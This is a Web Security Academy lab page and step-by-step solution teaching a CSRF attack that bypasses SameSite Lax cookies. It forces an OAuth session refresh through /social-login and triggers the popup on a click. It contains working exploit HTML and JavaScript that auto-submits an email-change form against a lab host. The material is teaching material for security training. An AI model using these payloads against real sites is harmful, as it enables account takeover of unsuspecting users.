# Lab: SameSite Lax bypass via cookie refresh

Source: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
Fetched: 2026-06-28T09:17:46.363397+00:00

Web Security Academy

CSRF

Bypassing SameSite cookie restrictions

Lab

Lab: SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

Note

The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:

<script>

window.onclick = () => {

window.open('about:blank')

}

</script>

Solution

Study the change email function

In Burp's browser, log in via your social media account and change your email address.

In Burp, go to the Proxy > HTTP history tab.

Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.

Look at the response to the GET /oauth-callback?code=[...] request at the end of the OAuth flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

Attempt a CSRF attack

In the browser, go to the exploit server.

Use the following template to create a basic CSRF attack for changing the victim's email address:

<script>

history.pushState('', '', '/')

</script>

<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">

<input type="hidden" name="email" value="foo@bar.com" />

<input type="submit" value="Submit request" />

</form>

<script>

document.forms[0].submit();

</script>

Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:

If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.

If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.

Bypass the SameSite restrictions

In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.

From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.

Go back to the exploit server.

Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause. The following is one possible approach:

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">

<input type="hidden" name="email" value="pwned@web-security-academy.net">

</form>

<script>

window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');

setTimeout(changeEmail, 5000);

function changeEmail(){

document.forms[0].submit();

}

</script>

Note that we've opened the /social-login in a new window to avoid navigating away from the exploit before the change email request is sent.

Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.

Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.

Bypass the popup blocker

Realize that the popup is being blocked because you haven't manually interacted with the page.

Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">

<input type="hidden" name="email" value="pwned@portswigger.net">

</form>

<p>Click anywhere on the page</p>

<script>

window.onclick = () => {

window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');

setTimeout(changeEmail, 5000);

}

function changeEmail() {

document.forms[0].submit();

}

</script>

Test the attack on yourself again while monitoring the proxy history in Burp.

When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie.

Go to your account page and confirm that your email address has changed.

Change the email address in your exploit so that it doesn't match your own.

Deliver the exploit to the victim to solve the lab.

Find CSRF vulnerabilities using Burp Suite

Try for free
